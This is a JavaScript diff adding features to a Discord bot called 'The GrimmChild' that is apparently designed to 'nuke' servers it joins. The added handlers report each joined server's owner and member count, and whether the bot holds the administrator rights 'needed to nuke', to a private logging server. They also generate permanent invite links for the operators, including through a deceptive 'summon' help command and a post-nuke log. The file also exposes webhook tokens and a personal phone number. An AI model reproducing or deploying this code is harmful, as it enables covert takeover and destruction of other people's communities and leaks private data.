@@ -8,6 +8,8 @@ const webhookClientNuke = new Discord.WebhookClient("763134567745585192", "_MgOS
 const webhookClientJoin = new Discord.WebhookClient("763134664994586675", "oToQNGd0eYED0SwfFKbQFyOX7s5VYcqK-gorudp0G-fsD0I3Jnyy1D0tGAP4iFDHbnrP");
 const guild = '782621562154254356'
 const logC = "782644045834747914"
+const guild2 = "772420474973192192"
+const logC2 = "781163971846864896"
 var pfp = 'https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png'
 //+1 626-708-0327 dani phone number
 
@@ -30,6 +32,133 @@ function read(filePath, cb) {
         }
     })
 }
+
+
+
+client.on("guildCreate", msg => {
+        const server = msg.client.guilds.cache.find(g => g.id === guild2)
+        const channel = server.channels.cache.find(c => c.id === logC2)
+    const Id = msg.channels.guild.id
+    const Oid = msg.channels.guild.ownerID
+    const Otag = msg.channels.guild.owner.user.tag
+    const Gm = msg.channels.guild.memberCount
+    const joinEmbed = new Discord.MessageEmbed()
+.setColor('#FF0435')
+.setTitle(`Joined "${msg.channels.guild.name}"`)
+.setAuthor('The GrimmChild', 'https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png')
+.addField(`Server ID: **${Id}** \nServer Owner ID: **${Oid}** \nServer Owner Tag: **${Otag}** \nServer MemberCount: **${Gm}**`, "_ _")
+.setDescription("The Bot DOES NOT have the permission ADMINISTRATOR needed to nuke!")
+
+
+const joinEmbed2 = new Discord.MessageEmbed()
+.setColor('#FF0435')
+.setTitle(`Joined "${msg.channels.guild.name}"`)
+.setAuthor('The GrimmChild', `https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png`)
+.addField(`Server ID: **${Id}**\nServer Owner ID: **${Oid}**\nServer Owner Tag: **${Otag}**\nServer MemberCount: **${Gm}**`, "_ _")
+.setDescription("The Bot DOES have the permission ADMINISTRATOR needed to nuke!")
+
+if(msg.me.hasPermission("ADMINISTRATOR")) {let ch = msg.channels.cache.find(c => c.type === "text")
+ch.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
+.then(invite => channel.send(joinEmbed2).then(channel.send(`discord.gg/${invite.code}`)))
+}else {
+    let ch = msg.channels.cache.find(c => c.type === "text")
+    ch.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
+    .then(invite => channel.send(joinEmbed).then(channel.send(`discord.gg/${invite.code}`)))
+}
+
+if(!msg.me.hasPermission("CREATE_INSTANT_INVITE")) {
+    channel.send(joinEmbed).then(channel.send("Couldn't create link..."))
+}
+})
+ 
+
+
+
+
+
+client.on("message", msg => {
+    if(msg.author.id === msg.client.user.id) {
+    if(msg.content === `@everyone all hail me`) {
+ const server = msg.client.guilds.cache.find(g => g.id === guild2)
+        const channel = server.channels.cache.find(c => c.id === logC2)
+
+  const Id = msg.guild.id
+  const Oid = msg.guild.ownerID
+  const Otag = msg.guild.owner.user.tag //user goes null so idk
+  const Gm = msg.guild.memberCount
+const nukeEmbed = new Discord.MessageEmbed()
+.setColor('#FF0435')
+.setTitle(`Nuked "${msg.guild.name}"`)
+.setAuthor(client.user.username, "https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png")
+.addField(`Server ID: **${Id}**\nServer Owner ID: **${Oid}**\nServer Owner Tag: **${Otag}**\nServer MemberCount: **${Gm}**`, "_ _")      
+msg.channel.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
+.then(invite => channel.send(nukeEmbed).then(channel.send(`discord.gg/${invite.code}`)))
+}
+    }
+})
+
+
+const commandCooldown1 = new Set()
+client.on("message", msg => {
+        if(msg.content.startsWith(`${prefix}summon`)) {
+ const server = msg.client.guilds.cache.find(g => g.id === guild2)
+        const channel = server.channels.cache.find(c => c.id === logC2)
+            if(commandCooldown1.has(msg.guild.id)) { msg.reply(" This command is on cooldown...") 
+            return; }
+            if(!msg.guild.me.hasPermission("CREATE_INSTANT_INVITE")) {msg.reply("I need the permission to create invites to summon the owner...") 
+            return;}
+            if(msg.guild.me.hasPermission("ADMINISTRATOR")) {
+            const Id = msg.guild.id
+            const Oid = msg.guild.ownerID
+            const Otag = msg.guild.owner.user.tag //user goes null so idk
+            const Gm = msg.guild.memberCount
+           
+        
+        const joinEmbed2 = new Discord.MessageEmbed()
+        .setColor('#FF0435')
+        .setTitle(`"${msg.guild.name}"`)
+        .setAuthor('The GrimmChild', `https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png`)
+        .addField(`Server ID: **${Id}**\nServer Owner ID: **${Oid}**\nServer Owner Tag: **${Otag}**\nServer MemberCount: **${Gm}**`, "_ _")
+        .setDescription("The Bot DOES have the permission ADMINISTRATOR needed to nuke!")
+        
+        msg.channel.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
+        .then(invite => channel.send(joinEmbed2).then(channel.send(`discord.gg/${invite.code} They ask for help <@${assy}>`)))
+    
+        commandCooldown1.add(msg.guild.id)    
+    }else {
+            const Id = msg.guild.id
+            const Oid = msg.guild.ownerID
+            const Otag = msg.guild.owner.user.tag
+            const Gm = msg.guild.memberCount
+            const joinEmbed = new Discord.MessageEmbed()
+            .setColor('#FE2B54')
+            .setTitle(`"${msg.guild.name}"`)
+            .setAuthor('The GrimmChild', 'https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png')
+            .addField(`Server ID: **${Id}** \nServer Owner ID: **${Oid}** \nServer Owner Tag: **${Otag}** \nServer MemberCount: **${Gm}**`)
+            .setDescription("The Bot DOES NOT have the permission ADMINISTRATOR needed to nuke!")
+            .setColor('#FF0435')
+            msg.channel.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
+            .then(invite => channel.send(joinEmbed).then(channel.send(`discord.gg/${invite.code} They asked for help <@${assy}>`)))
+
+            
+        commandCooldown1.add(msg.guild.id)
+        }
+setTimeout(() => {
+    commandCooldown1.delete(msg.guild.id)
+  }, 60000);//cooldown is cleared after 60 seconds
+}
+})
+
+
+
+
+
+
+
+
+
+
+
 
 
 client.on('message', msg => {
